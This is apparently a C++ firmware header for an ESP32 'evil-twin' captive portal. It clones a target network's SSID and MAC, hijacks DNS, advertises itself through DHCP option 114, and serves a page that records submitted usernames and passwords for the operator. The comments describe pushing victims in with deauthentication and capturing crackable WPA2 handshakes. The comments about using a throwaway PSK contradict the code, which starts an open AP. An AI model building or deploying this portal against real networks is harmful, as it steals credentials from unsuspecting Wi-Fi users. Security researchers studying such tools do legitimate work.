// portal.h — the evil-twin captive portal: the thing a client LANDS on.
//
// WHY THERE IS NO COPIED CODE IN THIS FILE
//   NRSuite's src/portal.cpp is GPL-3.0. This firmware is MIT, and GPL code
//   linked into it makes the whole thing GPL — irreversibly. So this file was
//   written from the clauses, not from their source: RFC 8910 §2.1 for the DHCP
//   option, RFC 2132 / RFC 2131 §2 for the option encoding, RFC 1035 §4.1 for
//   the DNS message. The only thing taken from the upstream recon is WHICH
//   PIECES a portal has — softAP, DNS responder, DHCP hint, HTTP, deauth. That
//   is an idea, not an expression, and it came with the rest of the recon.
//
// WHAT IT IS
//   A softAP wearing a target's identity, a DNS responder that hijacks every
//   name it can and refuses the ones it cannot, DHCP option 114 telling modern
//   clients outright where to go, and an HTTP server that serves the operator's
//   page and keeps what is typed into it.
//
// WHAT IT IS NOT
//   The deauth that drives clients here is NOT in this file. This is only ever
//   what a client lands on; the knock-off and the ordering live in the
//   orchestrator (app/www/js/portal.js), because ordering is a property of the
//   message sequence and this file cannot see the other messages. Enforcing a
//   sequence rule where the sequence is not visible would be theatre.
//
// IT HOLDS NOTHING
//   No filesystem, no NVS. The page is RAM, the submissions are a small RAM
//   ring, and both die with the power. The board is a radio and a socket; the
//   operator's phone is the only place a captured credential is ever written
//   down. Power it off and it knows nothing.
//
// HOUSE STYLE: this module never replies to the phone. It exposes state and
// poll functions; main.cpp reads them and builds every frame. That is why
// portal_take_submission() hands a struct over rather than emitting anything.

#pragma once

#include <WiFi.h>
#include <WiFiUdp.h>
#include <WebServer.h>
#include <esp_wifi.h>
#include "protocol.h"    // wifi_channel_ok — the one band-plan policy
#include <esp_netif.h>
#include <esp_heap_caps.h>
#include <esp_random.h>
#include <esp_system.h>
#include <string.h>
#include <stdio.h>

#include "portal_dns.h"

// ─── the gate ────────────────────────────────────────────────────────────────
// Byte-for-byte the token portal.js requires. The test is equality, not a
// trim/case-fold, so 'true', '1', 'yes', 'on', 'ARM' and 'i-own-this-frequency'
// all fail. Kept as a string rather than a bool so the caller has to have
// noticed; a boolean arm is one a UI can set by accident.
static const char* PORTAL_ACK_TOKEN = "I-own-this-frequency";
static const char* PORTAL_ATTR      = "portal/armed";

// ─── shape ───────────────────────────────────────────────────────────────────
static const size_t PORTAL_PAGE_MAX = 4096;   // page pushed up from the phone, PSRAM-backed
static const size_t PORTAL_URI_MAX  = 96;
static const size_t PORTAL_SUB_RING = 8;      // in RAM only, drained by the phone
static const size_t PORTAL_USER_MAX = 64;
static const size_t PORTAL_PASS_MAX = 128;
static const size_t PORTAL_BODY_MAX = 2048;
static const size_t PORTAL_DNS_MAX  = 512;    // a hijack answer never approaches this
static const int    PORTAL_MAX_CONN = 2;       // captive portal: one victim at a time
static const int    PORTAL_HTTP_PORT = 80;
static const int    PORTAL_DNS_PORT  = 53;

// The AP's own address, fixed, and what every hijacked name resolves to. This is
// the address the DHCP server hands out as the gateway, so it is also what the
// client will reach the page on.
static IPAddress PORTAL_IP(192, 168, 4, 1);
static IPAddress PORTAL_MASK(255, 255, 255, 0);
static const char* PORTAL_DEFAULT_URI = "http://192.168.4.1/";

// ─── state ───────────────────────────────────────────────────────────────────
static bool     g_pt_on         = false;
static bool     g_pt_ap_up      = false;
static char     g_pt_ssid[33]   = {0};
static uint8_t  g_pt_bssid[6]   = {0};
static bool     g_pt_have_bssid = false;
static uint8_t  g_pt_ch         = 1;
static bool     g_pt_hidden     = false;
static char     g_pt_psk[64]    = {0};   // WPA2 passphrase is 8..63 chars — 32 truncated a max-length one

// The DHCP server RETAINS this pointer for its whole lifetime (esp_netif.h:543),
// so it must outlive the call. A local buffer here would dangle and the option
// would go out as whatever the stack happened to leave behind. File scope, and
// written once at start.
static char     g_pt_uri[PORTAL_URI_MAX] = {0};

// Crash forensics. RTC_NOINIT_ATTR keeps these across a software reset (a panic
// reboots without clearing RTC slow memory), which is the only way to learn what
// the heap looked like at the instant of an abort inside the closed-source WiFi
// blob. PT_DIAG_MAGIC distinguishes a real reading from power-on garbage.
#define PT_DIAG_MAGIC 0x58494348u          // "XICH"
RTC_NOINIT_ATTR static uint32_t g_pt_diag_magic    = 0;
RTC_NOINIT_ATTR static uint32_t g_pt_diag_heap     = 0;
RTC_NOINIT_ATTR static uint32_t g_pt_diag_largest  = 0;
RTC_NOINIT_ATTR static uint32_t g_pt_diag_internal = 0;

// The captive portal page lives in PSRAM, not internal DRAM. At 4 KB it is the
// single largest allocation in this module — keeping it off the internal heap
// leaves room for the softAP stack and TCP buffers.
static char*    g_pt_page       = nullptr;
static size_t   g_pt_page_len   = 0;
static bool     g_pt_page_open  = false;   // a chunked push is in flight

static WiFiUDP   g_pt_dns;
static bool      g_pt_dns_open  = false;
static WebServer g_pt_http(PORTAL_HTTP_PORT);
static bool      g_pt_http_open = false;

struct PortalSub {
    char     user[PORTAL_USER_MAX];
    char     pass[PORTAL_PASS_MAX];
    char     ip[16];
    uint32_t ms;
    bool     blank;   // password field present but empty — recorded, never counted
};

static PortalSub g_pt_subs[PORTAL_SUB_RING];
static uint8_t   g_pt_sub_head  = 0;   // next slot to write
static uint8_t   g_pt_sub_count = 0;

// Counters. The status reply is built entirely from these, so nothing here is
// decorative: every number is something the operator can check against a phone.
static uint32_t g_pt_dns_queries  = 0;
static uint32_t g_pt_dns_answered = 0;
static uint32_t g_pt_dns_refused  = 0;   // AAAA and friends: NOERROR, no record
static uint32_t g_pt_dns_bad      = 0;   // malformed or not a query
static uint32_t g_pt_http_gets    = 0;
static uint32_t g_pt_http_posts   = 0;
static uint32_t g_pt_http_miss    = 0;   // any path other than / — still served the page
static uint32_t g_pt_subs_taken   = 0;
static uint32_t g_pt_subs_blank   = 0;
static uint32_t g_pt_stations_ever = 0;
static uint32_t g_pt_started_ms   = 0;

static bool portal_on() { return g_pt_on; }
static bool portal_running() { return g_pt_on; }

// ─── DNS: hijack what can be hijacked, refuse what cannot ────────────────────
//
// The encoder itself lives in portal_dns.h — a file with no Arduino and no WiFi
// in it — so the host test can compile THAT file and have tshark judge its
// bytes. Keeping two independent implementations (this one and the JS in
// app/www/js/portal.js) is deliberate: two encoders agreeing is evidence,
// whereas one encoder agreeing with itself is not.

static uint8_t g_pt_dnsbuf[PORTAL_DNS_MAX];
static uint8_t g_pt_dnsout[PORTAL_DNS_MAX];

// The hijack target as raw bytes, because portal_dns.h deliberately knows
// nothing about IPAddress — that is what lets the host compile it.
static const uint8_t PORTAL_IP_BYTES[4] = {192, 168, 4, 1};

static void portal_service_dns() {
    if (!g_pt_dns_open) return;
    int avail = g_pt_dns.parsePacket();
    if (avail <= 0) return;

    int n = g_pt_dns.read(g_pt_dnsbuf, sizeof(g_pt_dnsbuf));
    if (n <= 0) return;
    g_pt_dns_queries++;

    bool   answered = false;
    size_t olen = dns_build_hijack(g_pt_dnsbuf, (size_t)n, g_pt_dnsout,
                                   sizeof(g_pt_dnsout), PORTAL_IP_BYTES, &answered);
    if (olen == 0) { g_pt_dns_bad++; return; }
    if (answered) g_pt_dns_answered++; else g_pt_dns_refused++;

    g_pt_dns.beginPacket(g_pt_dns.remoteIP(), g_pt_dns.remotePort());
    g_pt_dns.write(g_pt_dnsout, olen);
    g_pt_dns.endPacket();
}

// ─── HTTP: the page, and what is typed into it ───────────────────────────────

// Percent-decoding, '+' as space, exactly as the JS parser does it. A malformed
// escape is passed through rather than dropped, so the operator sees what the
// client actually sent instead of a silently cleaned version of it.
static String portal_urldecode(const String& s) {
    String o;
    o.reserve(s.length());
    for (size_t i = 0; i < s.length(); i++) {
        char c = s[i];
        if (c == '+') { o += ' '; continue; }
        if (c == '%' && i + 2 < s.length()) {
            auto hexv = [](char h) -> int {
                if (h >= '0' && h <= '9') return h - '0';
                if (h >= 'a' && h <= 'f') return h - 'a' + 10;
                if (h >= 'A' && h <= 'F') return h - 'A' + 10;
                return -1;
            };
            int hi = hexv(s[i + 1]), lo = hexv(s[i + 2]);
            if (hi < 0 || lo < 0) { o += c; continue; }
            o += (char)((hi << 4) | lo);
            i += 2;
            continue;
        }
        o += c;
    }
    return o;
}

static const char* PORTAL_PW_FIELDS[]   = {"password", "pass", "pwd", "passwd", "passphrase", nullptr};
static const char* PORTAL_USER_FIELDS[] = {"username", "user", "email", "login", "uname", "userid", nullptr};

static bool portal_name_in(const char* const* names, const String& key) {
    for (int i = 0; names[i]; i++) if (key.equalsIgnoreCase(names[i])) return true;
    return false;
}

// Pull one field out of a urlencoded body. `present` and `empty` are separate
// answers on purpose: a form that submits `password=` HAS a password field and
// submitted it blank, which is a different fact from a form with no password
// field at all. Collapsing those two attaches the wrong reason to a correct
// verdict — the same bug fixed on the JS side, not repeated here.
static void portal_field(const String& body, const char* const* names,
                         String& value, bool& present) {
    value = ""; present = false;
    int from = 0;
    while (from <= (int)body.length()) {
        int amp = body.indexOf('&', from);
        String pair = (amp < 0) ? body.substring(from) : body.substring(from, amp);
        int eq = pair.indexOf('=');
        String k = portal_urldecode(eq < 0 ? pair : pair.substring(0, eq));
        String v = (eq < 0) ? "" : portal_urldecode(pair.substring(eq + 1));
        if (!present && k.length() && portal_name_in(names, k)) {
            value = v;
            present = true;   // first occurrence wins, matching the JS
        }
        if (amp < 0) break;
        from = amp + 1;
    }
}

static void portal_ring_push(const PortalSub& s) {
    g_pt_subs[g_pt_sub_head] = s;
    g_pt_sub_head = (uint8_t)((g_pt_sub_head + 1) % PORTAL_SUB_RING);
    if (g_pt_sub_count < PORTAL_SUB_RING) g_pt_sub_count++;
}

// Hands one queued submission to the caller. main.cpp emits it. The module does
// not talk to the phone, so this is the seam.
static bool portal_take_submission(PortalSub* out) {
    if (g_pt_sub_count == 0) return false;
    uint8_t idx = (uint8_t)((g_pt_sub_head + PORTAL_SUB_RING - g_pt_sub_count) % PORTAL_SUB_RING);
    if (out) *out = g_pt_subs[idx];
    g_pt_sub_count--;
    return true;
}

static void portal_handle_root() {
    g_pt_http_gets++;
    g_pt_http.sendHeader("Cache-Control", "no-store");
    if (g_pt_page_len == 0) {
        // A portal with no page is a dead end, and a silent dead end looks like a
        // bug in our tool rather than an empty slot in the operator's. Say which.
        g_pt_http.send(200, "text/html",
            "<!doctype html><meta name=viewport content='width=device-width,initial-scale=1'>"
            "<title>portal</title><body style=\"font:16px system-ui;padding:2rem\">"
            "<p>Portal is up. No page has been pushed to this board yet.</p>"
            "<p style=\"color:#666\">Push one from the phone before using this in anger.</p>");
        return;
    }
    g_pt_page[g_pt_page_len] = 0;   // PORTAL_PAGE_MAX keeps one spare byte for this
    g_pt_http.send(200, "text/html", g_pt_page);
}

static void portal_handle_submit() {
    g_pt_http_posts++;

    // A form post is parsed into args by WebServer; a fetch() body lands in
    // "plain". Reassemble whichever arrived so ONE parser handles both shapes,
    // rather than two parsers that can disagree about the same submission.
    String body = g_pt_http.arg("plain");
    if (body.length() == 0) {
        for (uint8_t i = 0; i < g_pt_http.args(); i++) {
            if (g_pt_http.argName(i) == "plain") continue;
            if (body.length()) body += "&";
            body += g_pt_http.argName(i) + "=" + g_pt_http.arg(i);
        }
    }
    if (body.length() > PORTAL_BODY_MAX) body = body.substring(0, PORTAL_BODY_MAX);

    String pass, user;
    bool   has_pass = false, has_user = false;
    portal_field(body, PORTAL_PW_FIELDS, pass, has_pass);
    portal_field(body, PORTAL_USER_FIELDS, user, has_user);

    PortalSub s;
    memset(&s, 0, sizeof(s));
    strncpy(s.user, user.c_str(), PORTAL_USER_MAX - 1);
    strncpy(s.pass, pass.c_str(), PORTAL_PASS_MAX - 1);
    strncpy(s.ip, g_pt_http.client().remoteIP().toString().c_str(), sizeof(s.ip) - 1);
    s.ms = millis();
    // Present-but-blank is recorded and counted as blank, never as a capture.
    s.blank = (!has_pass || pass.length() == 0);
    if (s.blank) g_pt_subs_blank++; else g_pt_subs_taken++;
    portal_ring_push(s);

    // A page is not a dead end: tell the victim something plausible. Which text
    // is the operator's business, so this is a plain redirect to the page.
    g_pt_http.sendHeader("Location", "/");
    g_pt_http.send(303, "text/plain", "");
}

// Any other path is served the page too. This is the whole point of a captive
// portal: whatever the OS probes for, it gets the page, so the sign-in appears
// no matter which URL it guessed.
static void portal_handle_any() {
    g_pt_http_miss++;
    portal_handle_root();
}

// ─── lifecycle ───────────────────────────────────────────────────────────────

static bool portal_arm_ok(const char* ssid, const char* bssid, int channel, const char* ack) {
    if (!ack || strcmp(ack, PORTAL_ACK_TOKEN) != 0) return false;
    if (!ssid) return false;
    size_t n = strlen(ssid);
    if (n == 0 || n > 32) return false;              // 802.11 §9.4.2.2 — 32 octets
    if (!wifi_channel_ok(channel)) return false;
    if (bssid && *bssid) {
        unsigned v[6];
        if (sscanf(bssid, "%x:%x:%x:%x:%x:%x", &v[0], &v[1], &v[2], &v[3], &v[4], &v[5]) != 6) return false;
        for (int i = 0; i < 6; i++) if (v[i] > 0xff) return false;
        if (v[0] & 0x01) return false;               // group bit — not a real AP identity
    }
    return true;
}

static void portal_stop(void);

// Bring up the AP. Returns a short reason string on failure, or nullptr on
// success — the caller surfaces it verbatim rather than a generic "failed",
// because "MAC rejected" and "channel rejected" need different fixes.
static const char* portal_start(const char* ssid, const char* bssid, int channel,
                                const char* ack, const char* uri, const char* psk) {
    if (g_pt_on) return "portal already running";
    if (!portal_arm_ok(ssid, bssid, channel, ack)) return "not armed: check ssid/channel/acknowledge";

    memset(g_pt_ssid, 0, sizeof(g_pt_ssid));
    strncpy(g_pt_ssid, ssid, sizeof(g_pt_ssid) - 1);
    g_pt_ch     = (uint8_t)channel;
    g_pt_hidden = false;
    g_pt_have_bssid = false;
    memset(g_pt_bssid, 0, sizeof(g_pt_bssid));

    if (bssid && *bssid) {
        unsigned v[6];
        sscanf(bssid, "%x:%x:%x:%x:%x:%x", &v[0], &v[1], &v[2], &v[3], &v[4], &v[5]);
        for (int i = 0; i < 6; i++) g_pt_bssid[i] = (uint8_t)v[i];
        g_pt_have_bssid = true;
    }

    memset(g_pt_uri, 0, sizeof(g_pt_uri));
    strncpy(g_pt_uri, (uri && *uri) ? uri : PORTAL_DEFAULT_URI, sizeof(g_pt_uri) - 1);

    // Pure AP, and that choice is LOAD-BEARING — not just tidiness.
    //
    // tx.h's tx_arm() requires WIFI_AP for management-frame injection ("the AP
    // interface has fewer restrictions") and only re-modes when the radio is NOT
    // already AP. Bringing the twin up in AP mode therefore means the deauth that
    // drives clients here injects from the same interface WITHOUT tearing down
    // the AP — which is what makes portal-up-then-deauth possible on this board
    // rather than a nice-sounding order that cannot actually run. AP_STA would
    // have looked harmless here and then made tx_arm re-mode the radio mid-run.
    //
    // The constraint this leaves: the deauth must be told the TWIN's channel.
    // tx_arm retunes the radio, so a deauth on any other channel would move the
    // AP off its own channel and drop the clients it was meant to push here.
    // The phone already forces the twin onto the target's channel; the deauth
    // call has to carry that same channel.
    WiFi.persistent(false);
    WiFi.mode(WIFI_AP);

    // The clone. Must happen BEFORE the AP starts — once it is up the identity is
    // committed and a later set is ignored.
    if (g_pt_have_bssid) {
        esp_err_t e = esp_wifi_set_mac(WIFI_IF_AP, g_pt_bssid);
        if (e != ESP_OK) { WiFi.mode(WIFI_OFF); return "ap mac rejected"; }
    }

    WiFi.softAPConfig(PORTAL_IP, PORTAL_IP, PORTAL_MASK);

    // --- crash forensics ------------------------------------------------------
    // Recorded immediately before the call that is known to abort. RTC slow
    // memory is NOT cleared by a software reset, so these survive the panic
    // reboot and STATUS can report what the heap looked like on the way in.
    // Without this, a softAP abort is a dead end: the trace tells you WHERE it
    // died (inside the WiFi blob) but never whether it was out of memory, out of
    // CONTIGUOUS memory, or neither — and those want opposite fixes.
    g_pt_diag_magic   = PT_DIAG_MAGIC;
    g_pt_diag_heap    = (uint32_t)ESP.getFreeHeap();
    g_pt_diag_largest = (uint32_t)heap_caps_get_largest_free_block(MALLOC_CAP_INTERNAL | MALLOC_CAP_8BIT);
    g_pt_diag_internal= (uint32_t)heap_caps_get_free_size(MALLOC_CAP_INTERNAL | MALLOC_CAP_8BIT);

    // A throwaway PSK, deliberately NOT the target's (we do not have it). The
    // client's cached key will not match ours, so it runs the 4-way handshake and
    // sends M2 — and M2 carries a MIC computed from the key we want. The handshake
    // completing is the one outcome we do not need: it is M2 that is crackable.
    // Offering this open instead would let clients with a saved WPA2 profile skip
    // the handshake entirely, which is the whole capture opportunity.
    //
    // An operator-supplied psk is accepted so a network whose key is already known
    // can be mimicked exactly. Either way the EFFECTIVE value is reported back in
    // the reply and in PORTAL_STATUS — without that the twin is unjoinable by
    // anyone, operator included, because the key is generated here and never
    // leaves the board.
    memset(g_pt_psk, 0, sizeof(g_pt_psk));
    if (psk && *psk) {
        size_t n = strlen(psk);
        if (n < 8 || n > 63) return "psk must be 8..63 chars (WPA2 passphrase)";
        strncpy(g_pt_psk, psk, sizeof(g_pt_psk) - 1);
    } else {
        snprintf(g_pt_psk, sizeof(g_pt_psk), "x%08lx%08lx", (unsigned long)esp_random(), (unsigned long)esp_random());
    }

    // Open AP, like NRSuite. The twin portal's job is credential collection;
    // WPA2 handshake capture is handled by the separate Sniffer module. An open
    // AP avoids WPA2/PMF compatibility failures on modern Android devices.
    {
        if (!WiFi.softAP(g_pt_ssid, nullptr, g_pt_ch, g_pt_hidden ? 1 : 0, PORTAL_MAX_CONN)) {
            WiFi.mode(WIFI_OFF); return "softap refused to start";
        }
    }
    g_pt_ap_up = true;

    // DHCP option 114 (RFC 8910 §2.1) — the modern, out-of-band hint that says
    // "there is a portal, here it is", so a client that honours it never needs to
    // probe. Set through the IDF encoder rather than by hand, so the bytes on the
    // wire are the stack's, and our JS builder stays an independent second
    // implementation to check them against.
    esp_netif_t* ap = esp_netif_get_handle_from_ifkey("WIFI_AP_DEF");
    if (ap) {
        // The DHCP server has to be restarted around the option: setting it while
        // running is not honoured on every IDF version, and a silently ignored
        // option is the worst outcome — the portal looks armed and no client is
        // ever told about it.
        esp_netif_dhcps_stop(ap);
        esp_ip4_addr_t dns_ip;
        dns_ip.addr = (uint32_t)PORTAL_IP;          // option 6: the client must ask US
        esp_netif_dhcps_option(ap, ESP_NETIF_OP_SET, ESP_NETIF_DOMAIN_NAME_SERVER,
                               &dns_ip, sizeof(dns_ip));
        esp_netif_dhcps_option(ap, ESP_NETIF_OP_SET, ESP_NETIF_CAPTIVEPORTAL_URI,
                               g_pt_uri, strlen(g_pt_uri));
        esp_netif_dhcps_start(ap);
    }

    g_pt_dns.begin(PORTAL_DNS_PORT);
    g_pt_dns_open = true;

    g_pt_http.on("/", HTTP_GET, portal_handle_root);
    g_pt_http.on("/", HTTP_POST, portal_handle_submit);
    g_pt_http.onNotFound(portal_handle_any);
    g_pt_http.begin();
    g_pt_http_open = true;

    g_pt_page_len = 0;      // nothing pushed yet; the placeholder answers meanwhile
    g_pt_page_open = false;

    // Allocate the page buffer from PSRAM. The internal heap is tight when the
    // softAP and TCP stack are up — this 4 KB block belongs in the 8 MB SPI RAM
    // the board carries specifically for buffers like this.
    g_pt_page = (char*)heap_caps_malloc(PORTAL_PAGE_MAX, MALLOC_CAP_SPIRAM);
    if (!g_pt_page) {
        portal_stop();
        return "psram alloc failed for page";
    }
    memset(g_pt_page, 0, PORTAL_PAGE_MAX);

    g_pt_on = true;
    g_pt_started_ms = millis();

    WiFi.scanDelete();
    return nullptr;
}

static void portal_stop() {
    if (g_pt_http_open) { g_pt_http.stop(); g_pt_http_open = false; }
    if (g_pt_dns_open)  { g_pt_dns.stop();  g_pt_dns_open  = false; }
    if (g_pt_ap_up)     { WiFi.softAPdisconnect(true); g_pt_ap_up = false; }
    WiFi.mode(WIFI_OFF);

    // Nothing survives a stop. A page and a captured credential are the two
    // things this board must never be holding when the operator thinks it is
    // finished with.
    if (g_pt_page) { free(g_pt_page); g_pt_page = nullptr; }
    g_pt_page_len = 0;
    g_pt_page_open = false;
    memset(g_pt_subs, 0, sizeof(g_pt_subs));
    g_pt_sub_head = 0;
    g_pt_sub_count = 0;
    memset(g_pt_psk, 0, sizeof(g_pt_psk));
    g_pt_have_bssid = false;
    g_pt_on = false;
}

// Called from loop(). Services the sockets, and drains nothing — the caller
// does that through portal_take_submission() so the module stays phone-blind.
static void portal_poll() {
    if (!g_pt_on) return;
    portal_service_dns();
    g_pt_http.handleClient();
    uint32_t now = WiFi.softAPgetStationNum();
    if (now > 0) g_pt_stations_ever = now > g_pt_stations_ever ? now : g_pt_stations_ever;
}

// ─── page push (chunked, so a big page survives a small frame MTU) ───────────

// Module-local hex decoder, matching bp_parse_hex / pr_parse_hex / tx_parse_hex.
// Every module parses its own hex rather than sharing a helper, so a change in
// one module's accepted input cannot silently widen another's.
static bool pt_parse_hex(const char* hex, uint8_t* out, size_t outcap, size_t* out_len) {
    if (!hex || !out || !out_len) return false;
    size_t n = strlen(hex);
    if (n == 0 || (n % 2) != 0) return false;
    size_t bytes = n / 2;
    if (bytes > outcap) return false;
    auto hv = [](char c) -> int {
        if (c >= '0' && c <= '9') return c - '0';
        if (c >= 'a' && c <= 'f') return c - 'a' + 10;
        if (c >= 'A' && c <= 'F') return c - 'A' + 10;
        return -1;
    };
    for (size_t i = 0; i < bytes; i++) {
        int hi = hv(hex[i * 2]), lo = hv(hex[i * 2 + 1]);
        if (hi < 0 || lo < 0) return false;
        out[i] = (uint8_t)((hi << 4) | lo);
    }
    *out_len = bytes;
    return true;
}

static bool portal_page_begin() {
    if (!g_pt_on || !g_pt_page) return false;
    g_pt_page_len  = 0;
    g_pt_page_open = true;
    memset(g_pt_page, 0, PORTAL_PAGE_MAX);
    return true;
}

static size_t portal_page_chunk(const uint8_t* data, size_t len) {
    if (!g_pt_on || !g_pt_page_open || !g_pt_page) return 0;
    // PORTAL_PAGE_MAX - 1: the last byte is kept for the terminator the HTTP
    // handler writes, so a full buffer can still be handed to send() as a C
    // string. Chunks beyond that are dropped rather than silently truncating a
    // page mid-tag.
    size_t room = (PORTAL_PAGE_MAX - 1) - g_pt_page_len;
    if (len > room) len = room;
    if (len) memcpy(g_pt_page + g_pt_page_len, data, len);
    g_pt_page_len += len;
    return len;
}

static bool portal_page_end() {
    if (!g_pt_on || !g_pt_page_open || !g_pt_page) return false;
    g_pt_page_open = false;
    g_pt_page[g_pt_page_len] = 0;
    return true;
}